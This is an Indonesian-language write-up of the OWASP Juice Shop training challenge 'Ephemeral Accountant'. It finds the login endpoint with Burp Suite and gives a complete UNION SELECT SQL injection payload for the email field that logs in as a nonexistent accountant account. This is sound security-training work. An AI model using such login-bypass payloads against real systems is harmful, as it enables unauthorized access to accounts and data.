# Soal 6 – Ephemeral Accountant

## 1. Pendahuluan
Challenge *Ephemeral Accountant* termasuk kategori **Injection** dengan tingkat kesulitan ⭐⭐⭐⭐.  
Tujuannya adalah melakukan login menggunakan akun `acc0unt4nt@juice-sh.op` yang sebenarnya tidak ada di database, tanpa perlu mendaftarkan user baru.  
Istilah *ephemeral* berarti akun ini hanya muncul sementara hasil dari query injection, tidak tersimpan secara permanen.

## 2. Identifikasi Titik Injeksi
Target challenge adalah form **Login** pada aplikasi OWASP Juice Shop.  
<img width="975" height="510" alt="image" src="https://github.com/user-attachments/assets/a8f83426-fb46-4ce0-800f-799a568dadab" />

menggunakan Burp Suit mencari Endpoint yang digunakan:
POST /rest/user/login
<img width="975" height="547" alt="image" src="https://github.com/user-attachments/assets/950d44c0-99ba-43d2-a9e5-bb93cb04a68c" />


Form ini meminta input `email` dan `password`.  
<img width="975" height="546" alt="image" src="https://github.com/user-attachments/assets/13bf72f1-7f19-45ab-9b68-d94aaa3dff54" />


## 3. Penyusunan Payload
Untuk membuat akun palsu sementara, digunakan **UNION SELECT** agar query menghasilkan row tambahan dengan data akun fiktif.  

Payload pada field `email`:
```sql
' UNION SELECT 20,'acc0unt4nt@juice-sh.op','acc0unt4nt@juice-sh.op','admin123','accounting','123','127.0.0.1','/assets/public/images/uploads/default.svg','',1,'2020-01-01','2020-01-01',NULL-- -
```
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/ce7de791-74e5-41fc-b941-c3f365ca5aae" />

## Selesai
<img width="975" height="544" alt="image" src="https://github.com/user-attachments/assets/6d4a020c-32fd-4a00-ad18-8f8b8558cf22" />

